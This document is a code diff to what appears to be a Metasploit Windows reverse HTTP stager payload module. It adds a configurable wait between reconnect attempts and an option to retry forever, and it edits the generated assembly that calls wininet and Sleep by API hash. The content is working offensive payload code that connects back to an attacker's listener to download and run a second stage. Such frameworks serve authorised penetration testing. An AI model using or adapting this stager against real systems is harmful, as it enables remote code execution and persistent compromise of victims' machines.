@@ -29,7 +29,8 @@ module Payload::Windows::ReverseHttp
     super
     register_advanced_options([
         OptInt.new('StagerURILength', [false, 'The URI length for the stager (at least 5 bytes)']),
-        OptInt.new('StagerRetryCount', [false, 'The number of times the stager should retry if the first connect fails', 10]),
+        OptInt.new('StagerRetryCount', [false, 'The number of times the stager should retry if the first connect fails (zero to infinite retries)', 10]),
+        OptInt.new('StagerRetryWait', [false, 'Number of seconds to wait for the stager between reconnect attempts', 5]),
         OptString.new('PayloadProxyHost', [false, 'An optional proxy server IP address or hostname']),
         OptPort.new('PayloadProxyPort', [false, 'An optional proxy server port']),
         OptString.new('PayloadProxyUser', [false, 'An optional proxy server username']),
@@ -42,23 +43,25 @@ module Payload::Windows::ReverseHttp
   # Generate the first stage
   #
   def generate(opts={})
+    ds = opts[:datastore] || datastore
     conf = {
       ssl:         opts[:ssl] || false,
-      host:        datastore['LHOST'],
-      port:        datastore['LPORT'],
-      retry_count: datastore['StagerRetryCount']
+      host:        ds['LHOST'],
+      port:        ds['LPORT'],
+      retry_count: ds['StagerRetryCount'],
+      retry_wait: ds['StagerRetryWait']
     }
 
     # Add extra options if we have enough space
     if self.available_space && required_space <= self.available_space
-      conf[:url]        = luri + generate_uri
-      conf[:exitfunk]   = datastore['EXITFUNC']
-      conf[:ua]         = datastore['MeterpreterUserAgent']
-      conf[:proxy_host] = datastore['PayloadProxyHost']
-      conf[:proxy_port] = datastore['PayloadProxyPort']
-      conf[:proxy_user] = datastore['PayloadProxyUser']
-      conf[:proxy_pass] = datastore['PayloadProxyPass']
-      conf[:proxy_type] = datastore['PayloadProxyType']
+      conf[:url]        = luri + generate_uri(opts)
+      conf[:exitfunk]   = ds['EXITFUNC']
+      conf[:ua]         = ds['MeterpreterUserAgent']
+      conf[:proxy_host] = ds['PayloadProxyHost']
+      conf[:proxy_port] = ds['PayloadProxyPort']
+      conf[:proxy_user] = ds['PayloadProxyUser']
+      conf[:proxy_pass] = ds['PayloadProxyPass']
+      conf[:proxy_type] = ds['PayloadProxyType']
     else
       # Otherwise default to small URIs
       conf[:url]        = luri + generate_small_uri
@@ -92,9 +95,9 @@ module Payload::Windows::ReverseHttp
   #
   # Generate the URI for the initial stager
   #
-  def generate_uri
-
-    uri_req_len = datastore['StagerURILength'].to_i
+  def generate_uri(opts={})
+    ds = opts[:datastore] || datastore
+    uri_req_len = ds['StagerURILength'].to_i
 
     # Choose a random URI length between 30 and 255 bytes
     if uri_req_len == 0
@@ -144,18 +147,20 @@ module Payload::Windows::ReverseHttp
   # @option opts [Bool] :ssl Whether or not to enable SSL
   # @option opts [String] :url The URI to request during staging
   # @option opts [String] :host The host to connect to
-  # @option opts [Fixnum] :port The port to connect to
+  # @option opts [Integer] :port The port to connect to
   # @option opts [String] :exitfunk The exit method to use if there is an error, one of process, thread, or seh
   # @option opts [String] :proxy_host The optional proxy server host to use
-  # @option opts [Fixnum] :proxy_port The optional proxy server port to use
+  # @option opts [Integer] :proxy_port The optional proxy server port to use
   # @option opts [String] :proxy_type The optional proxy server type, one of HTTP or SOCKS
   # @option opts [String] :proxy_user The optional proxy server username
   # @option opts [String] :proxy_pass The optional proxy server password
-  # @option opts [Fixnum] :retry_count The number of times to retry a failed request before giving up
+  # @option opts [Integer] :retry_count The number of times to retry a failed request before giving up
+  # @option opts [Integer] :retry_wait The seconds to wait before retry a new request
   #
   def asm_reverse_http(opts={})
 
-    retry_count   = [opts[:retry_count].to_i, 1].max
+    retry_count   = opts[:retry_count].to_i
+    retry_wait   = opts[:retry_wait].to_i * 1000
     proxy_enabled = !!(opts[:proxy_host].to_s.strip.length > 0)
     proxy_info    = ""
 
@@ -314,14 +319,20 @@ module Payload::Windows::ReverseHttp
         push 0x3B2E55EB        ; hash( "wininet.dll", "HttpOpenRequestA" )
         call ebp
         xchg esi, eax          ; save hHttpRequest in esi
-
+     ^
+    if retry_count > 0
+      asm << %Q^
       ; Store our retry counter in the edi register
       set_retry:
         push #{retry_count}
         pop edi
+      ^
+    end
 
+    asm << %Q^
       send_request:
     ^
+
 
     if opts[:ssl]
       asm << %Q^
@@ -348,14 +359,30 @@ module Payload::Windows::ReverseHttp
         push 0x7B18062D        ; hash( "wininet.dll", "HttpSendRequestA" )
         call ebp
         test eax,eax
-        jnz allocate_memory
+        jnz allocate_memory  
+   
+     set_wait:
+        push #{retry_wait}     ; dwMilliseconds
+        push 0xE035F044        ; hash( "kernel32.dll", "Sleep" )
+        call ebp               ; Sleep( dwMilliseconds );
+      ^
+    
+    if retry_count > 0
+      asm << %Q^
+        try_it_again:
+          dec edi
+          jnz send_request
 
-      try_it_again:
-        dec edi
-        jnz send_request
+        ; if we didn't allocate before running out of retries, bail out
+        ^
+    else
+      asm << %Q^
+        try_it_again:
+          jmp send_request
 
-      ; if we didn't allocate before running out of retries, bail out
-    ^
+        ; retry forever
+        ^
+    end
 
     if opts[:exitfunk]
       asm << %Q^
